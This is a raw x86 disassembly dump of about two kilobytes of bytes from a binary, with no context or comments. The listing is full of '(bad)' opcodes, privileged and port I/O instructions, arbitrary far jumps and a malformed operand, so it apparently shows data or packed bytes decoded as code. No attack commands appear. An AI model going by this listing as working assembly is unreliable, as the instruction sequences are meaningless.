  41d90c:	cmp    BYTE PTR [eax],bl
  41d90e:	in     al,dx
  41d90f:	mov    eax,0x6eba6af0
  41d914:	jmp    0x85b9:0x320315a3
  41d91b:	and    dh,BYTE PTR [ebp-0x1c1da044]
  41d921:	stos   BYTE PTR es:[edi],al
  41d922:	aam    0x9c
  41d924:	jge    0x41d9a4
  41d926:	push   0x42ff8cc5
  41d92b:	mov    ds:0x7e2fbf5e,eax
  41d930:	and    dh,BYTE PTR [eax+0x1ee43b17]
  41d936:	inc    ebp
  41d937:	mov    ebx,0x5bda9f8a
  41d93c:	pop    ebp
  41d93d:	lds    eax,FWORD PTR [edi]
  41d93f:	mov    WORD PTR [edx+0x27],fs
  41d942:	or     bl,BYTE PTR [esi+edx*4]
  41d945:	adc    BYTE PTR [edx],0x80
  41d948:	mov    al,0x71
  41d94a:	call   0x2f3fe88f
  41d94f:	cwde   
  41d950:	pop    edi
  41d951:	and    BYTE PTR [ebx+eiz*4+0x48],al
  41d955:	fldcw  WORD PTR [ebx-0x6cd0defa]
  41d95b:	cmp    bl,BYTE PTR [edx+ecx*4-0x1005676e]
  41d962:	inc    esp
  41d963:	push   0xffffffde
  41d965:	or     al,0xd8
  41d967:	jg     0x41d9cf
  41d969:	rcr    BYTE PTR [ebx],0xad
  41d96c:	mov    esp,0x87755d66
  41d971:	mov    ch,0xa6
  41d973:	adc    eax,0xf6fa196d
  41d978:	fisub  WORD PTR [ecx]
  41d97a:	(bad)
  41d97e:	and    edx,ecx
  41d980:	xchg   edx,eax
  41d981:	imul   di,WORD PTR [ecx+0x66],0x5a
  41d986:	mov    bl,0xcf
  41d988:	je     0x41d91b
  41d98a:	push   ds
  41d98b:	mov    al,ds:0x66d40483
  41d990:	jae    0x41d9ec
  41d992:	rcr    BYTE PTR [edi],1
  41d994:	sti    
  41d995:	mov    ah,dh
  41d997:	dec    DWORD PTR [ecx+0x72]
  41d99a:	outs   dx,DWORD PTR ds:[esi]
  41d99b:	repnz cld 
  41d99d:	dec    esi
  41d99e:	cs inc edi
  41d9a0:	sahf   
  41d9a1:	(bad)  
  41d9a2:	aaa    
  41d9a3:	jb     0x41d982
  41d9a5:	sub    ecx,DWORD PTR [edi-0x61]
  41d9a8:	cmp    cl,BYTE PTR [ebp-0x30]
  41d9ab:	jns    0x41d92d
  41d9ad:	xor    dh,dl
  41d9af:	xchg   ebx,eax
  41d9b0:	xor    al,0xda
  41d9b2:	mov    al,0x6d
  41d9b4:	pop    ebp
  41d9b5:	int    0x83
  41d9b7:	stos   DWORD PTR es:[edi],eax
  41d9b8:	aam    0x4e
  41d9ba:	push   ebx
  41d9bb:	pop    ecx
  41d9bc:	neg    BYTE PTR [eax+eax*1]
  41d9bf:	jne    0x41da01
  41d9c1:	inc    edx
  41d9c2:	jecxz  0x41d961
  41d9c4:	xchg   ebx,eax
  41d9c5:	stos   DWORD PTR es:[edi],eax
  41d9c6:	(bad)  
  41d9c7:	xchg   edx,eax
  41d9c8:	shl    WORD PTR [edx],1
  41d9cb:	sti    
  41d9cc:	push   ecx
  41d9cd:	jp     0x41d95b
  41d9cf:	pop    es
  41d9d0:	xchg   edx,eax
  41d9d1:	shl    BYTE PTR [edi],cl
  41d9d3:	sbb    al,0xa9
  41d9d5:	xchg   DWORD PTR [ecx],edi
  41d9d7:	fadd   st,st(6)
  41d9d9:	inc    eax
  41d9da:	mov    ebx,ebx
  41d9dc:	stos   BYTE PTR es:[edi],al
  41d9dd:	clc    
  41d9de:	dec    edx
  41d9df:	dec    eax
  41d9e0:	dec    ebp
  41d9e1:	outs   dx,DWORD PTR ds:[esi]
  41d9e2:	pop    eax
  41d9e3:	ins    DWORD PTR es:[edi],dx
  41d9e4:	ret    0xb44a
  41d9e7:	xchg   ecx,eax
  41d9e8:	ins    DWORD PTR es:[edi],dx
  41d9e9:	jmp    0x934f:0xe8811023
  41d9f0:	dec    eax
  41d9f1:	pop    es
  41d9f2:	and    eax,0xd60594b1
  41d9f7:	stc    
  41d9f8:	jmp    0x41da69
  41d9fa:	mov    al,ds:0x2b4a65ad
  41d9ff:	xchg   edx,eax
  41da00:	and    BYTE PTR [edx+0x69da9a3f],dl
  41da06:	test   ch,dh
  41da08:	xchg   DWORD PTR ss:[ecx+0x1d],eax
  41da0c:	add    DWORD PTR [ebx],0x2f
  41da0f:	xor    BYTE PTR [edx],dh
  41da11:	jg     0x41d9db
  41da13:	xchg   edx,eax
  41da14:	jecxz  0x41da73
  41da16:	push   0x255c14f
  41da1b:	dec    ebp
  41da1c:	fsubr  QWORD PTR [esi]
  41da1e:	mov    eax,0xafdf9500
  41da23:	dec    esi
  41da24:	das    
  41da25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da26:	sub    DWORD PTR [edi+edx*2+0x27],0xcfd777fb
  41da2e:	mov    ds:0xf36ece3e,eax
  41da33:	ja     0x41da07
  41da35:	sbb    ecx,edi
  41da37:	and    dl,ah
  41da39:	push   0x9c56f26b
  41da3e:	out    0x6c,eax
  41da40:	ret    
  41da41:	out    dx,eax
  41da42:	das    
  41da43:	nop
  41da44:	jmp    0x98887a74
  41da49:	inc    ebp
  41da4a:	dec    eax
  41da4b:	dec    esi
  41da4c:	das    
  41da4d:	xchg   DWORD PTR fs:[edi-0x53b4950e],ecx
  41da54:	inc    edx
  41da55:	and    al,0x83
  41da57:	ret    0xd583
  41da5a:	sbb    bh,ch
  41da5c:	pop    ss
  41da5d:	sub    al,0x17
  41da5f:	mov    ds:0x5278b622,eax
  41da64:	xor    eax,0xa78b8b3e
  41da69:	rcl    BYTE PTR [edi],cl
  41da6b:	mov    edx,0xb5c0d67b
  41da70:	lea    esp,[edx+0x27096ce4]
  41da76:	push   es
  41da77:	jbe    0x41da45
  41da79:	push   0x11
  41da7b:	sub    eax,0xde66000d
  41da80:	in     eax,dx
  41da81:	xor    ch,bl
  41da83:	sub    DWORD PTR [eax-0x2b],ecx
  41da86:	adc    ecx,DWORD PTR ds:0x73591c6e
  41da8c:	loope  0x41da53
  41da8e:	mov    WORD PTR [ebx-0x643946ac],ds
  41da94:	xchg   DWORD PTR [edx],edx
  41da96:	xor    DWORD PTR [edx+0x73],edx
  41da99:	sahf   
  41da9a:	xor    al,0x51
  41da9c:	mov    esi,0xb76df761
  41daa2:	test   eax,0xda486802
  41daa7:	add    BYTE PTR [ebx-0x3e98d5c0],0x67
  41daae:	xchg   edx,eax
  41daaf:	ror    BYTE PTR [edx+0x3a],0x85
  41dab3:	add    eax,DWORD PTR [esi+0x5a]
  41dab6:	sub    esp,0x78
  41dab9:	lds    esp,FWORD PTR [ebx-0x77]
  41dabc:	aas    
  41dabd:	clc    
  41dabe:	xor    al,cl
  41dac0:	jmp    0x7022:0xa2e880c0
  41dac7:	or     edx,DWORD PTR [esi]
  41dac9:	lahf   
  41daca:	cdq    
  41dacb:	dec    esp
  41dacc:	sbb    BYTE PTR [eax-0x1f5004e0],al
  41dad2:	dec    ebx
  41dad3:	jnp    0x41dadd
  41dad5:	mov    DWORD PTR [ecx+0x2],ebp
  41dad8:	cmp    al,0xc0
  41dada:	int    0x13
  41dadc:	adc    al,0xdf
  41dade:	and    ebx,DWORD PTR [ecx+0x64845a9f]
  41dae4:	pushf  
  41dae5:	repnz xchg edx,eax
  41dae7:	dec    edi
  41dae8:	jmp    0x428e:0x7aaa828c
  41daef:	ret    0x4b2e
  41daf2:	outs   dx,BYTE PTR ds:[esi]
  41daf3:	fstp   QWORD PTR [edi]
  41daf5:	xor    DWORD PTR [eax+0x51155573],ebx
  41dafb:	adc    al,0x6c
  41dafd:	adc    eax,esp
  41daff:	or     DWORD PTR [esi+0x34],0x15
  41db03:	ins    DWORD PTR es:[edi],dx
  41db04:	daa    
  41db05:	fisttp QWORD PTR [edx+0x42]
  41db08:	les    esi,FWORD PTR [ebp+0x3d]
  41db0b:	ds adc al,0x8d
  41db0e:	xor    ebp,0x1e21ab9a
  41db14:	fdiv   st,st(5)
  41db16:	xchg   ebx,eax
  41db17:	push   edi
  41db18:	dec    edi
  41db19:	push   esp
  41db1a:	out    dx,al
  41db1b:	mov    ecx,0xca7a1aa
  41db20:	dec    esi
  41db21:	add    eax,0x4d0f367b
  41db26:	xlat   BYTE PTR ds:[ebx]
  41db27:	sti    
  41db28:	fcomp  QWORD PTR [esi-0x1]
  41db2b:	sub    eax,0xabadbb45
  41db30:	jmp    0xa4d9e44d
  41db35:	stos   BYTE PTR es:[edi],al
  41db36:	cs adc edi,esp
  41db39:	(bad)  
  41db3b:	jg     0x41dabe
  41db3d:	int    0x8f
  41db3f:	dec    ebp
  41db40:	sbb    BYTE PTR [ebp-0x50225e54],0xc6
  41db47:	gs aam 0xfd
  41db4a:	gs xor DWORD PTR ss:[ebx-0x1c],0xffffffcb
  41db50:	cmp    eax,ebp
  41db52:	ja     0x41db1e
  41db54:	int3   
  41db55:	int    0x0
  41db57:	sub    al,BYTE PTR [eax-0x13]
  41db5a:	leave  
  41db5b:	mov    fs,WORD PTR [esp+eiz*8]
  41db5e:	leave  
  41db5f:	and    dh,dh
  41db61:	or     BYTE PTR ds:0x35e071e2,dl
  41db67:	ret    0x9ddf
  41db6a:	ss addr16 iret 
  41db6d:	add    BYTE PTR [edi-0x55d7408a],bh
  41db73:	and    ch,bl
  41db75:	fld    DWORD PTR [edx]
  41db77:	xchg   DWORD PTR [ebx],ecx
  41db79:	arpl   WORD PTR [ebx+0x1c],di
  41db7c:	call   0xb8131542
  41db81:	sub    BYTE PTR [edi-0x3b7f1f5],ch
  41db87:	ja     0x41dbf1
  41db89:	js     0x41db63
  41db8b:	int3   
  41db8c:	mov    ebx,0xc842f1f4
  41db91:	push   ds
  41db92:	aas    
  41db93:	or     cl,ch
  41db95:	aad    0xe9
  41db97:	clc    
  41db98:	(bad)  
  41db99:	fcom   DWORD PTR [ebx+0x2fe46c86]
  41db9f:	inc    ebx
  41dba0:	adc    edi,DWORD PTR [ebp-0x423135de]
  41dba6:	fcom   DWORD PTR [ebx-0x2b532ccf]
  41dbac:	push   edx
  41dbad:	das    
  41dbae:	pop    esi
  41dbaf:	xchg   BYTE PTR [ecx],ah
  41dbb1:	add    edx,0xf7a821b1
  41dbb7:	cmp    BYTE PTR [ebx-0x70],ah
  41dbba:	int    0x5c
  41dbbc:	(bad)  [edi+0x6e]
  41dbbf:	jg     0x41dbdf
  41dbc1:	popf   
  41dbc2:	in     eax,dx
  41dbc3:	mov    bl,0xe1
  41dbc5:	xlat   BYTE PTR ds:[ebx]
  41dbc6:	test   DWORD PTR [esi],eax
  41dbc8:	daa    
  41dbc9:	popa   
  41dbca:	ret    0x8e4
  41dbcd:	inc    eax
  41dbce:	sbb    ecx,0x2
  41dbd1:	cmc    
  41dbd2:	mov    bl,0xcd
  41dbd4:	push   edi
  41dbd5:	dec    ebx
  41dbd6:	push   ebx
  41dbd7:	or     al,0x3e
  41dbd9:	xchg   edx,eax
  41dbda:	cmp    BYTE PTR [esi-0x1a],al
  41dbdd:	cmc    
  41dbde:	addr16 lock sbb al,0x31
  41dbe2:	push   0xffffffa8
  41dbe4:	or     dl,BYTE PTR ds:0x314c7544
  41dbea:	fldlg2 
  41dbec:	xchg   edi,eax
  41dbed:	cmp    DWORD PTR [edi+0x39],ebp
  41dbf0:	or     BYTE PTR [eax+0x3a],0x2e
  41dbf4:	pop    ecx
  41dbf5:	repnz iret 
  41dbf7:	xor    al,0xd9
  41dbf9:	into   
  41dbfa:	cdq    
  41dbfb:	xchg   esp,eax
  41dbfc:	int3   
  41dbfd:	int    0x9e
  41dbff:	lahf   
  41dc00:	mov    eax,ds:0xfdb4795d
  41dc05:	daa    
  41dc06:	jbe    0x41dc65
  41dc08:	sbb    ah,ah
  41dc0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc0b:	stos   DWORD PTR es:[edi],eax
  41dc0c:	xor    esi,0xb8696bcc
  41dc12:	sbb    DWORD PTR [edi],0xc6bec84d
  41dc18:	shl    BYTE PTR [edx],1
  41dc1a:	mov    ebx,0x8877de05
  41dc1f:	dec    edx
  41dc20:	dec    ecx
  41dc21:	lahf   
  41dc22:	and    bh,ch
  41dc24:	mov    dl,0x89
  41dc26:	mov    cl,0xf
  41dc28:	add    al,0x59
  41dc2a:	imul   ebx,DWORD PTR [ebx],0xffffffcd
  41dc2d:	inc    ebx
  41dc2e:	pop    ebx
  41dc2f:	xlat   BYTE PTR ds:[ebx]
  41dc30:	loope  0x41dc89
  41dc32:	pop    edx
  41dc33:	sbb    al,0xef
  41dc35:	adc    DWORD PTR [ebp+0x10],0x56d0f83
  41dc3c:	push   0xbcb31b95
  41dc41:	add    ebp,DWORD PTR [ebp+edx*1+0x71]
  41dc45:	or     eax,0x5c4a0833
  41dc4a:	daa    
  41dc4b:	push   ebx
  41dc4c:	out    dx,al
  41dc4d:	mov    al,ds:0x41f9a789
  41dc52:	sbb    BYTE PTR [edx-0x5],dh
  41dc55:	fsub   QWORD PTR [edi+0x5cb0dee1]
  41dc5b:	push   ecx
  41dc5c:	or     cl,BYTE PTR [ecx+ebx*1-0x14]
  41dc60:	std    
  41dc61:	and    BYTE PTR [ebp+0x54c587d6],bh
  41dc67:	xor    bl,bl
  41dc69:	ror    BYTE PTR [edx+edx*2],1
  41dc6c:	inc    ebp
  41dc6d:	movq   QWORD PTR [ecx-0x3a],mm4
  41dc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc72:	jnp    0x41dc2d
  41dc74:	les    esi,FWORD PTR [ebp-0x20de8c99]
  41dc7a:	test   DWORD PTR [ebp-0x6e],0x7900ded1
  41dc81:	(bad)  
  41dc82:	rcr    DWORD PTR [edx-0x3a38d278],1
  41dc88:	test   al,0xd9
  41dc8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc8b:	(bad)  
  41dc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc8d:	sub    BYTE PTR [ecx-0x5136f84e],0xca
  41dc94:	je     0x41dcd0
  41dc96:	push   es
  41dc97:	sar    BYTE PTR [esi],1
  41dc99:	(bad)  
  41dc9a:	(bad)  
  41dc9c:	rcr    BYTE PTR [ecx-0x14],0xe3
  41dca0:	ds icebp 
  41dca2:	sbb    cl,0xb1
  41dca5:	add    al,0xae
  41dca7:	arpl   bp,di
  41dca9:	aas    
  41dcaa:	xor    DWORD PTR [ecx+0x51],eax
  41dcad:	iret   
  41dcae:	icebp  
  41dcaf:	pop    es
  41dcb0:	out    0x97,eax
  41dcb2:	loope  0x41dc42
  41dcb4:	pop    ebx
  41dcb5:	jae    0x41dcee
  41dcb7:	mov    ds:0x1f3855e9,al
  41dcbc:	push   ebx
  41dcbd:	(bad)  
  41dcbe:	nop
  41dcbf:	jno    0x41dd3e
  41dcc1:	pop    edx
  41dcc2:	jp     0x41dc92
  41dcc4:	enter  0xca91,0xa1
  41dcc8:	inc    ebp
  41dcc9:	mov    ebx,0x582a9d90
  41dcce:	stos   BYTE PTR es:[edi],al
  41dccf:	or     BYTE PTR [ebp-0x5b],dh
  41dcd2:	dec    ecx
  41dcd3:	adc    eax,0xc92d9b52
  41dcd8:	lds    ecx,FWORD PTR [esi]
  41dcda:	int    0x1b
  41dcdc:	clc    
  41dcdd:	inc    eax
  41dcde:	popf   
  41dcdf:	jb     0x41dc7b
  41dce1:	les    esi,FWORD PTR [esi]
  41dce3:	retf   0x49e6
  41dce6:	adc    dh,BYTE PTR [edx+edi*2+0x3614a4a1]
  41dced:	push   ds
  41dcee:	jp     0x41dc8c
  41dcf0:	shl    BYTE PTR [ebp+0x2b5387b5],1
  41dcf6:	or     al,BYTE PTR [edi-0x11c2ef1d]
  41dcfc:	not    cl
  41dcfe:	jne    0x41dd6e
  41dd00:	repz fs (bad) 
  41dd03:	mov    edi,0x1a4058dc
  41dd08:	jmp    0xc2f618d1
  41dd0d:	mov    ah,0x9a
  41dd0f:	(bad)  
  41dd10:	adc    DWORD PTR [esp+edx*4-0x1725d586],edx
  41dd17:	mov    ah,0x7a
  41dd19:	add    al,0xfa
  41dd1b:	mov    esi,0xde5a2255
  41dd20:	mov    DWORD PTR [eax+eax*4-0x15],ecx
  41dd24:	fisub  WORD PTR ds:0x21a279d0
  41dd2a:	jb     0x41dccc
  41dd2c:	xchg   DWORD PTR [edi],esp
  41dd2e:	adc    al,0xfc
  41dd30:	xchg   BYTE PTR [ebx+0x1831909f],dh
  41dd36:	stc    
  41dd37:	jo     0x41dcd7
  41dd39:	fild   QWORD PTR [ebx+esi*1-0x31]
  41dd3d:	test   DWORD PTR [edx+0x34],ecx
  41dd40:	jg     0x41dd0d
  41dd42:	or     cl,BYTE PTR ds:0xc12cdc4d
  41dd48:	push   eax
  41dd49:	adc    esp,DWORD PTR es:[ecx-0xe]
  41dd4d:	iret   
  41dd4e:	mov    edi,esi
  41dd50:	and    eax,0x363b7ea
  41dd55:	jns    0x41dd9c
  41dd57:	or     ah,BYTE PTR [eax+0x48]
  41dd5a:	mov    bh,0xa9
  41dd5c:	sbb    DWORD PTR [ebp+0x4e1f865e],edi
  41dd62:	adc    eax,0x23630124
  41dd67:	(bad)  
  41dd69:	dec    esp
  41dd6a:	inc    ebp
  41dd6b:	jbe    0x41dd28
  41dd6d:	mov    edi,0xfd9e359f
  41dd72:	jmp    0x41dd2f
  41dd74:	mov    esp,0x5606a9cf
  41dd79:	(bad)  [edx-0x4c]
  41dd7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd7d:	pop    ebx
  41dd7e:	cmp    DWORD PTR [ebx],esi
  41dd80:	iret   
  41dd81:	aam    0xe
  41dd83:	push   edx
  41dd84:	pop    es
  41dd85:	fcmovnbe st,st(3)
  41dd87:	jb     0x41dd0c
  41dd89:	jmp    FWORD PTR [eax]
  41dd8b:	sahf   
  41dd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd8d:	(bad)  
  41dd8e:	fcomp  DWORD PTR [esi+eax*2]
  41dd91:	fidivr WORD PTR [eax-0x5]
  41dd94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd95:	adc    DWORD PTR [ebx-0x2216bc16],ebx
  41dd9b:	cli    
  41dd9c:	sub    DWORD PTR [ebx],ebp
  41dd9e:	mov    bl,0x50
  41dda0:	sub    dh,BYTE PTR [esi+0x2d]
  41dda3:	mov    eax,eax
  41dda5:	sub    esp,DWORD PTR [edx]
  41dda7:	xchg   ecx,eax
  41dda8:	pop    ebp
  41dda9:	sub    ch,ah
  41ddab:	je     0x41dd3d
  41ddad:	aam    0xb9
  41ddaf:	sar    esi,0x47
  41ddb2:	sub    BYTE PTR [ebx+ecx*2-0x3021b6a3],dh
  41ddb9:	hlt    
  41ddba:	inc    ebx
  41ddbb:	jle    0x41dd46
  41ddbd:	inc    ebp
  41ddbe:	push   edx
  41ddbf:	cmp    eax,0x611df500
  41ddc4:	xor    DWORD PTR [eax],edi
  41ddc6:	xor    BYTE PTR [esi+0x7f],ch
  41ddc9:	(bad)  
  41ddca:	push   0x2cd3c544
  41ddcf:	imul   ecx,DWORD PTR [ecx+0x10],0xd017825a
  41ddd6:	call   0xc208:0xfc0f558a
  41dddd:	add    esp,DWORD PTR [eax+0x2f6657d3]
  41dde3:	ins    BYTE PTR es:[edi],dx
  41dde4:	cmp    DWORD PTR [edx-0x2bbf745d],esi
  41ddea:	mov    WORD PTR [edx],ss
  41ddec:	add    BYTE PTR [ebp+0x1357c033],0xe8
  41ddf3:	out    0x8d,eax
  41ddf5:	xor    esp,DWORD PTR [ecx+0x0]
  41ddf8:	or     ch,0x3d
  41ddfb:	add    al,0xe3
  41ddfd:	add    al,0xf5
  41ddff:	(bad)  
  41de00:	jbe    0x41ddc8
  41de02:	push   edi
  41de03:	or     DWORD PTR [edi+0x1a],ebp
  41de06:	outs   dx,BYTE PTR ds:[esi]
  41de07:	or     DWORD PTR [ebp+0x7eb9477c],ecx
  41de0d:	xor    bh,0xac
  41de10:	jno    0x41de86
  41de12:	xchg   BYTE PTR ds:0x66fb6be0,ah
  41de18:	cmp    DWORD PTR [eax-0x5530c534],ebx
  41de1e:	cmp    eax,0xcc72bbc8
  41de23:	fucomi st,st(6)
  41de25:	dec    esp
  41de26:	ins    BYTE PTR es:[edi],dx
  41de27:	sub    cl,BYTE PTR [ebx+eiz*4-0x7a]
  41de2b:	js     0x41ddd7
  41de2d:	pop    ecx
  41de2e:	push   ebp
  41de2f:	test   DWORD PTR ds:[ebp-0x5087ceaa],ebp
  41de36:	push   es
  41de37:	icebp  
  41de38:	fadd   QWORD PTR [ecx-0x50b07623]
  41de3e:	sahf   
  41de3f:	xor    esi,DWORD PTR [ebp-0x20]
  41de42:	imul   edi,DWORD PTR [edi],0xfffffffc
  41de45:	or     BYTE PTR [ecx+ecx*4-0xd64039b],ah
  41de4c:	ret    
  41de4d:	mov    eax,ds:0x8a49dfa0
  41de52:	sub    edi,DWORD PTR [ebx+0x4e]
  41de55:	loopne 0x41de2a
  41de57:	pop    es
  41de58:	call   0x271fbcce
  41de5d:	jp     0x41dde8
  41de5f:	push   edi
  41de60:	loope  0x41ded5
  41de62:	add    cl,BYTE PTR [edi-0xc]
  41de65:	idiv   BYTE PTR [ebp+0x2c80be4f]
  41de6b:	aad    0xd5
  41de6d:	aaa    
  41de6e:	int3   
  41de6f:	xor    eax,0x4c3d12bb
  41de74:	call   0x6b2a:0x575807eb
  41de7b:	enter  0xa687,0x5a
  41de7f:	mov    dl,0x75
  41de81:	pop    ecx
  41de82:	sbb    DWORD PTR [edi],ebx
  41de84:	mov    dl,0x4d
  41de86:	and    eax,ebp
  41de88:	inc    esi
  41de89:	push   edi
  41de8a:	sbb    cl,bl
  41de8c:	jo     0x41de62
  41de8e:	sub    ah,BYTE PTR [ebx]
  41de90:	jmp    0x4c1bbfac
  41de95:	cld    
  41de96:	pop    ecx
  41de97:	adc    bl,BYTE PTR [edi]
  41de99:	int3   
  41de9a:	push   ebp
  41de9b:	or     edx,0x2c2e0e59
  41dea1:	pushf  
  41dea2:	adc    BYTE PTR [edi+0x3f03c4f1],0xe6
  41dea9:	push   ss
  41deaa:	xchg   ecx,eax
  41deab:	icebp  
  41deac:	stc    
  41dead:	inc    edi
  41deae:	push   edi
  41deaf:	xor    ecx,DWORD PTR [ecx-0x3f]
  41deb2:	push   ecx
  41deb3:	in     eax,0xf9
  41deb5:	fdivr  QWORD PTR [ecx+edi*8-0x4d73d110]
  41debc:	push   es
  41debd:	clc    
  41debe:	mov    al,0x16
  41dec0:	clc    
  41dec1:	push   es
  41dec2:	leave  
  41dec3:	pop    ebp
  41dec4:	dec    ebx
  41dec5:	mov    BYTE PTR es:[ecx-0x4efc4918],ch
  41decc:	mov    dh,0xf4
  41dece:	stos   BYTE PTR es:[edi],al
  41decf:	in     al,0x70
  41ded1:	ins    DWORD PTR es:[edi],dx
  41ded2:	push   edi
  41ded3:	sub    DWORD PTR ds:0x277961b6,0x5552f6
  41dedd:	add    edx,ecx
  41dedf:	inc    esi
  41dee0:	push   ebp
  41dee1:	sar    BYTE PTR [ecx+0x582876cc],0xdd
  41dee8:	or     BYTE PTR [ebp-0x40fd4907],al
  41deee:	mov    ds:0x3e06ec57,eax
  41def3:	out    dx,al
  41def4:	std    
  41def5:	fucomp st(0)
  41def7:	jnp    0x41de94
  41def9:	fsub   QWORD PTR [ebx-0x7e33eda5]
  41deff:	push   cs
  41df00:	xor    al,0xec
  41df02:	cmp    eax,0xa36c0db8
  41df07:	das    
  41df08:	xchg   esp,eax
  41df09:	xor    eax,0xec91c69
  41df0e:	mov    edi,DWORD PTR [esi+0x5ac43fcb]
  41df14:	add    esp,DWORD PTR [ecx-0x2295f08c]
  41df1a:	pop    ebx
  41df1b:	adc    al,0xfd
  41df1d:	gs push es
  41df1f:	test   al,0x62
  41df21:	cmp    al,0xd
  41df23:	xchg   edi,eax
  41df24:	into   
  41df25:	push   esi
  41df26:	(bad)  
  41df27:	mov    eax,0x32e46b2a
  41df2c:	xchg   DWORD PTR [edi],edx
  41df2e:	cdq    
  41df2f:	not    DWORD PTR [ecx]
  41df31:	daa    
  41df32:	mov    edx,0x24f21095
  41df37:	push   es
  41df38:	(bad)  
  41df3a:	adc    eax,0xed3e5090
  41df3f:	dec    ebx
  41df40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df41:	int    0x1b
  41df43:	cli    
  41df44:	sbb    ecx,edx
  41df46:	mov    ecx,0xa1590a4d
  41df4b:	fwait
  41df4c:	mov    dh,0xd
  41df4e:	rol    ebp,cl
  41df50:	or     al,0xc7
  41df52:	loop   0x41df98
  41df54:	stc    
  41df55:	add    edx,DWORD PTR [ecx+0x2d]
  41df58:	sbb    BYTE PTR [ebp+0x510f0a42],bh
  41df5e:	(bad)  
  41df5f:	int    0x38
  41df61:	dec    edx
  41df62:	adc    DWORD PTR [eax],eax
  41df64:	sahf   
  41df65:	lods   al,BYTE PTR ds:[esi]
  41df66:	ins    DWORD PTR es:[edi],dx
  41df67:	jae    0x41dfa9
  41df69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df6a:	sbb    bl,BYTE PTR [ebx+0x37]
  41df6d:	sahf   
  41df6e:	ds push eax
  41df70:	mov    WORD PTR [ebp+0x5e],?
  41df73:	push   eax
  41df74:	jge    0x41df78
  41df76:	push   ebx
  41df77:	dec    ebx
  41df78:	mov    edi,0xa9795739
  41df7d:	repnz dec esp
  41df7f:	stos   BYTE PTR es:[edi],al
  41df80:	push   es
  41df81:	imul   eax,DWORD PTR [edx+0x58327227],0x21
  41df88:	xor    ch,dh
  41df8a:	mov    bh,0x73
  41df8c:	xor    esi,DWORD PTR [esp+ecx*1]
  41df8f:	imul   DWORD PTR [eax]
  41df91:	add    cl,BYTE PTR [edi-0x5479c28]
  41df97:	mov    BYTE PTR [eax-0xe1f155f],bh
  41df9d:	mov    ebx,DWORD PTR [esi]
  41df9f:	dec    esp
  41dfa0:	or     ecx,DWORD PTR [esi-0x61]
  41dfa3:	inc    ebx
  41dfa4:	sub    al,0xff
  41dfa6:	in     al,0x3f
  41dfa8:	sbb    DWORD PTR [esi+0x66],eax
  41dfab:	dec    ebp
  41dfac:	int3   
  41dfad:	or     eax,0xbd1ef836
  41dfb2:	sub    BYTE PTR [ecx+0x529849a7],ch
  41dfb8:	push   0x7b768df4
  41dfbd:	xor    ebp,DWORD PTR [esi+eiz*4]
  41dfc0:	scas   al,BYTE PTR es:[edi]
  41dfc1:	int    0x43
  41dfc3:	sbb    dh,dl
  41dfc5:	push   edi
  41dfc6:	retf   0x48f9
  41dfc9:	sub    bl,ah
  41dfcb:	out    dx,al
  41dfcc:	dec    ebp
  41dfcd:	dec    BYTE PTR [ecx+0x49ac0a46]
  41dfd3:	fld    TBYTE PTR [ecx-0x1e]
  41dfd6:	xchg   edi,eax
  41dfd7:	stos   DWORD PTR es:[edi],eax
  41dfd8:	jmp    0x8f48:0xd7ead5e2
  41dfdf:	push   DWORD PTR [esi+0x6a]
  41dfe2:	push   0x73fb5cc6
  41dfe7:	loope  0x41e047
  41dfe9:	imul   esp,DWORD PTR [edi-0x2c],0xffffffe1
  41dfed:	pop    ds
  41dfee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfef:	jecxz  0x41dffd
  41dff1:	mov    WORD PTR ds:0xf991e6ec,di
  41dff8:	test   DWORD PTR [esi],ecx
  41dffa:	mov    al,dh
  41dffc:	mov    eax,ds:0x7c5166f5
  41e001:	ret    
  41e002:	push   ds
  41e003:	sub    al,0x22
  41e005:	mov    ds:0x8af3998e,al
  41e00a:	mov    al,ds:0x68db542a
  41e00f:	sub    edi,DWORD PTR [edi]
  41e011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e012:	mov    al,ds:0x102058c9
  41e017:	clc    
  41e018:	gs stos DWORD PTR es:[edi],eax
  41e01a:	repz mov ch,0xa2
  41e01d:	dec    edx
  41e01e:	inc    esi
  41e01f:	in     al,dx
  41e020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e021:	cmp    cl,ch
  41e023:	retf   
  41e024:	xchg   ebx,eax
  41e025:	aad    0xd
  41e027:	stos   DWORD PTR es:[edi],eax
  41e028:	mov    bl,BYTE PTR [eax-0x6642f4d0]
  41e02e:	imul   esp,DWORD PTR [esi],0xc9100ecb
  41e034:	mov    dl,0x54
  41e036:	ins    BYTE PTR es:[edi],dx
  41e037:	adc    eax,DWORD PTR [ecx]
  41e039:	jl     0x41e02d
  41e03b:	mov    ebp,0x13079ae
  41e040:	or     DWORD PTR [edi+0x45005e95],ebx
  41e046:	lods   al,BYTE PTR ds:[esi]
  41e047:	sub    edx,DWORD PTR ds:[esi+0x58]
  41e04b:	mov    al,ds:0x9007c93e
  41e050:	outs   dx,DWORD PTR ds:[esi]
  41e051:	ret    0x1dbe
  41e054:	and    ch,BYTE PTR [esi+0x3a]
  41e057:	sar    DWORD PTR gs:[eax+0x34],1
  41e05b:	mov    bh,0x53
  41e05d:	xchg   cl,dh
  41e05f:	adc    DWORD PTR [edx],edx
  41e061:	mov    ecx,0xcfff55b3
  41e066:	mov    cl,BYTE PTR [ebx]
  41e068:	sub    eax,0xbfd01ddd
  41e06d:	inc    ebx
  41e06e:	fadd   QWORD PTR [eax+0x25]
  41e071:	xor    al,0x1b
  41e073:	fmul   QWORD PTR [edx-0x33]
  41e076:	inc    esp
  41e077:	pop    ebp
  41e078:	mov    edi,DWORD PTR [ebp+0x67]
  41e07b:	jno    0x41e04d
  41e07d:	cmp    BYTE PTR [edx],0xa7
  41e080:	leave  
  41e081:	imul   edi,DWORD PTR [edi-0x79],0xffffff8e
